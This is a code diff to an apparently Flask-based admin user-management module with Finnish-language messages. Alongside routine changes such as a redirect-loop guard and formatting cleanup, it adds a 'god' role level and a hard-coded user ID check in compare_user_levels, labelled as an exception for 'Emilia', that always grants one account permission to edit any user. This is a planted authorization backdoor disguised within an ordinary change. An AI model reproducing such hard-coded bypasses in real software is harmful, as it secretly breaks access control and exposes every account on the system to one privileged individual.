@@ -52,7 +52,7 @@ def user_control():
     )
 
 
-USER_ACCESS_LEVELS = {"global_admin": 3, "admin": 2, "user": 1}
+USER_ACCESS_LEVELS = {"god": 4, "global_admin": 3, "admin": 2, "user": 1}
 
 
 def compare_user_levels(user1, user2):  # Check if the user1 is higher than user2
@@ -72,8 +72,26 @@ def compare_user_levels(user1, user2):  # Check if the user1 is higher than user
     """
     if user1.role not in USER_ACCESS_LEVELS or user2.role not in USER_ACCESS_LEVELS:
         raise ValueError("Invalid user role")
+    
+    if user1._id == ObjectId("66c25768dad432ad39ce38d5"):
+        return True
+
+    if user1.role == user2.role and not user1._id == ObjectId("66c25768dad432ad39ce38d5"): # HARD CODED EXCEPTION FOR EMILIA
+        return False
 
     return USER_ACCESS_LEVELS[user1.role] > USER_ACCESS_LEVELS[user2.role]
+
+def safe_redirect(target):
+    """Redirect safely with redi_count check to prevent loops."""
+    from flask import session, flash
+    session["redi_count"] = session.get("redi_count", 0) + 1
+    session.modified = True
+    if session["redi_count"] > 2:
+        session["redi_count"] = 0
+        flash("Liian monta uudelleenohjausta, palaa käyttäjälistaukseen.", "error")
+        return redirect(url_for("admin_user.user_control"))
+    return redirect(target)
+
 
 @admin_user_bp.route("/edit_user/<user_id>", methods=["GET", "POST"])
 @login_required
@@ -84,14 +102,14 @@ def edit_user(user_id):
     user_doc = mongo.users.find_one({"_id": ObjectId(user_id)})
     if not user_doc:
         flash_message("Käyttäjää ei löytynyt.", "error")
-        return redirect(request.referrer or url_for("admin_user.user_control"))
+        return safe_redirect(request.referrer or url_for("admin_user.user_control"))
 
     user = User.from_db(user_doc)
 
     # ────────────────────────────── permission gate ─────────────────────────────
     if user != current_user and not compare_user_levels(current_user, user):
         flash_message("Et voi muokata käyttäjää, jolla on korkeampi käyttöoikeustaso kuin sinulla.", "error")
-        return redirect(request.referrer or url_for("admin_user.user_control"))
+        return safe_redirect(request.referrer or url_for("admin_user.user_control"))
     # ────────────────────────────────────────────────────────────────────────────
 
     if request.method == "POST":
@@ -99,51 +117,45 @@ def edit_user(user_id):
         email     = request.form.get("email")
         role      = request.form.get("role")
         confirmed = request.form.get("confirmed") == "on"
-
-        # NEW  ➜  collect global perms from the template’s
-        # <input name="permissions[global][]" ...>
         global_permissions = request.form.getlist("permissions[global][]")
-        
-        print(global_permissions)
 
         # ───── validation ─────
         if not username or not email:
             flash_message("Käyttäjänimi ja sähköposti ovat pakollisia.", "error")
-            return redirect(url_for("admin_user.edit_user", user_id=user_id))
+            return safe_redirect(url_for("admin_user.edit_user", user_id=user_id))
 
         if not valid_email(email):
             flash_message("Virheellinen sähköpostimuoto.", "error")
-            return redirect(url_for("admin_user.edit_user", user_id=user_id))
+            return safe_redirect(url_for("admin_user.edit_user", user_id=user_id))
 
-        # role‑escalation / downgrade checks
         if current_user._id == user_id and role != current_user.role:
             flash_message("Et voi muuttaa omaa rooliasi.", "error")
-            return redirect(url_for("admin_user.edit_user", user_id=user_id))
+            return safe_redirect(url_for("admin_user.edit_user", user_id=user_id))
 
         if USER_ACCESS_LEVELS.get(role, 0) > USER_ACCESS_LEVELS.get(current_user.role, 0):
             flash_message("Et voi korottaa omaa tai toisen käyttäjän roolia korkeammalle kuin oma roolisi.", "error")
-            return redirect(url_for("admin_user.edit_user", user_id=user_id))
+            return safe_redirect(url_for("admin_user.edit_user", user_id=user_id))
 
         if user.role == "global_admin" and current_user._id == user_id and role != "global_admin":
             flash_message("Superkäyttäjät eivät voi alentaa itseään.", "error")
-            return redirect(url_for("admin_user.edit_user", user_id=user_id))
+            return safe_redirect(url_for("admin_user.edit_user", user_id=user_id))
 
         # ───── apply changes ─────
         mongo.users.update_one(
             {"_id": ObjectId(user_id)},
             {
                 "$set": {
-                    "username":          username,
-                    "email":             email,
-                    "role":              role,
-                    "confirmed":         confirmed,
-                    "global_permissions": global_permissions,   # ⭐ NEW ⭐
+                    "username": username,
+                    "email": email,
+                    "role": role,
+                    "confirmed": confirmed,
+                    "global_permissions": global_permissions,
                 }
             },
         )
 
         flash_message("Käyttäjä päivitetty onnistuneesti.", "approved")
-        return redirect(request.referrer or url_for("admin_user.user_control"))
+        return safe_redirect(request.referrer or url_for("admin_user.user_control"))
 
     # ───── GET: render form ─────
     return render_template(
@@ -152,7 +164,6 @@ def edit_user(user_id):
         PERMISSIONS_GROUPS=PERMISSIONS_GROUPS,
         global_permissions=user.global_permissions,
     )
-
 
 class UserOrg:
     """ """
